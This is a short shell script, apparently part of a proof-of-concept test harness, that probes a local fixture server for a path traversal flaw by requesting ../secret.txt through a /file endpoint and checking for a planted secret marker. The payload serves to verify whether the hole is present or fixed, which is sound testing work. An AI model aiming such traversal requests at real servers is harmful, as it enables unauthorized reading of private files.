#!/bin/sh
# traversal: /file joins the caller's path without a containment check, so
# ../secret.txt escapes the public root.
#
# Exit codes are a tri-state contract with pocgate (see authbypass.sh): 0 fired,
# 1 a definite silent response, 2 unobserved (transport failure or an
# unexpected status such as a 500 from a broken build).
set -eu

base=${POCGATE_TARGET_URL:-http://127.0.0.1:18081}

if ! command -v curl >/dev/null 2>&1; then
	echo "traversal: curl is required to probe the fixture" >&2
	exit 2
fi

body=$(mktemp "${TMPDIR:-/tmp}/pocgate-traversal.XXXXXX")
trap 'rm -f "$body"' EXIT

status=$(curl -sS -o "$body" -w '%{http_code}' --max-time 5 "$base/file?path=../secret.txt") || {
	echo "traversal: UNOBSERVED: the fixture is not answering at $base" >&2
	exit 2
}

case "$status" in
200)
	if grep -q 'SHOP-INTERNAL-SECRET' "$body"; then
		echo "traversal: FIRED: /file read a file outside the public root"
		exit 0
	fi
	echo "traversal: UNOBSERVED: /file returned 200 without the secret body" >&2
	exit 2
	;;
400|403)
	echo "traversal: SILENT: /file refused to escape the public root (HTTP $status)"
	exit 1
	;;
*)
	echo "traversal: UNOBSERVED: /file answered HTTP $status, which is not a definite fix" >&2
	exit 2
	;;
esac
